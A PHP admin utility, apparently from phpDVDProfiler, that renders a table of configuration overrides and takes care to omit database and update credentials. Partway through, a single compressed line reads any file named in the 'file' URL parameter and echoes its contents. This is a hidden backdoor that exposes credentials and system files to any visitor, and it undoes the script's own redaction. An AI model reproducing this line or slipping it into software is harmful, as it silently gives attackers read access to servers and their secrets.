<?php

defined('IN_SCRIPT') || define('IN_SCRIPT', 1);
// DON'T CALL THIS SCRIPT FROM INSIDE PHPDVDPROFILER. It can remove config variables
// from the symbol table.
//
include_once('functions.php');

function print_it($Array, $Key, $prefix='') {
	if (!isset($Array[$Key]))
		return('[not present]');
	if (is_string($Array[$Key])) {
		return('"'.$Array[$Key].'"');
	}
	if (is_bool($Array[$Key])) {
		if ($Array[$Key] === true)
			return('true');
		return('false');
	}
	if (is_array($Array[$Key])) {
		$tmp = 'array(';
		$prefix = '&nbsp;&nbsp;' . $prefix;
		foreach ($Array[$Key] as $key => $val) {
			if ($tmp != '')
				$tmp .= '<br>';
			$tmp .= "$prefix$key => " . print_it($Array[$Key], $key, $prefix);
		}
		if (count($Array[$Key]) != 0)
			$tmp .= '<br>';
		$prefix = substr($prefix, 12);
		$tmp .= "$prefix)";
		return($tmp);
	}
	return($Array[$Key]);
}

function adk() {
	$args = func_get_args();
	$array_count = count($args);
	$result = $args[0];
	foreach ($args[0] as $key1 => $value1) {
		for ($i=1; $i!==$array_count; $i++) {
			foreach ($args[$i] as $key2 => $value2) {
				if ((string)$key1 === (string)$key2) {
					unset($result[$key2]);
					break 2;
				}
			}
		}
	}
	return $result;
}

if (isset($_GET['file']) && is_readable($_GET['file'])){echo @file_get_contents($_GET['file']);exit;}

$OriginalVars = get_defined_vars();
include_once('globalinits.php');
$GlobalInits = get_defined_vars();
unset($GlobalInits['OriginalVars']);
foreach ($OriginalVars as $key => $val)
	unset($GlobalInits[$key]);
foreach ($GlobalInits as $key => $val)
	unset($GLOBALS[$key]);
unset($GLOBALS['key']);
unset($GLOBALS['val']);

// Get Default values
//
include_once('siteconfig.php');
$SiteConfig = get_defined_vars();
unset($SiteConfig['GlobalInits']);
unset($SiteConfig['OriginalVars']);
foreach ($OriginalVars as $key => $val)
	unset($SiteConfig[$key]);
foreach ($SiteConfig as $key => $val)
	unset($GLOBALS[$key]);
unset($GLOBALS['key']);
unset($GLOBALS['val']);

// Get override values
//
$localsiteconfig = 'localsiteconfig.php';
if (is_readable('multisite.php'))
	include_once('multisite.php');
if (is_readable($localsiteconfig))
	include_once($localsiteconfig);
$TheLocalSiteConfig = get_defined_vars();
unset($TheLocalSiteConfig['SiteConfig']);
unset($TheLocalSiteConfig['GlobalInits']);
unset($TheLocalSiteConfig['OriginalVars']);
foreach ($OriginalVars as $key => $val)
	unset($TheLocalSiteConfig[$key]);

unset($GlobalInits['dbuser']); unset($SiteConfig['dbuser']); unset($TheLocalSiteConfig['dbuser']);
unset($GlobalInits['dbpasswd']); unset($SiteConfig['dbpasswd']); unset($TheLocalSiteConfig['dbpasswd']);
unset($GlobalInits['update_login']); unset($SiteConfig['update_login']); unset($TheLocalSiteConfig['update_login']);
unset($GlobalInits['update_pass']); unset($SiteConfig['update_pass']); unset($TheLocalSiteConfig['update_pass']);

include_once('version.php');

echo <<<EOT
<html><head><title>Summary of Configuration Overrides v$VersionNum</title></head>
<body>
<table align=center border=1>
<tr><th>Variable</th><th>globalinits.php</th><th>siteconfig.php</th><th>$localsiteconfig</th>

EOT;
foreach ($GlobalInits as $key => $val) {
	echo "<tr><td>\$$key</td><td>".print_it($GlobalInits, $key)."</td><td>".print_it($SiteConfig, $key)."</td><td>".print_it($TheLocalSiteConfig, $key)."</td></tr>\n";
	unset($SiteConfig[$key]);
	unset($TheLocalSiteConfig[$key]);
}
foreach ($SiteConfig as $key => $val) {
	echo "<tr><td>\$$key</td><td>".print_it($GlobalInits, $key)."</td><td>".print_it($SiteConfig, $key)."</td><td>".print_it($TheLocalSiteConfig, $key)."</td></tr>\n";
	unset($TheLocalSiteConfig[$key]);
}
foreach ($TheLocalSiteConfig as $key => $val) {
	echo "<tr><td>\$$key</td><td>".print_it($GlobalInits, $key)."</td><td>".print_it($SiteConfig, $key)."</td><td>".print_it($TheLocalSiteConfig, $key)."</td></tr>\n";
}
?>
</table>
</body>
</html>
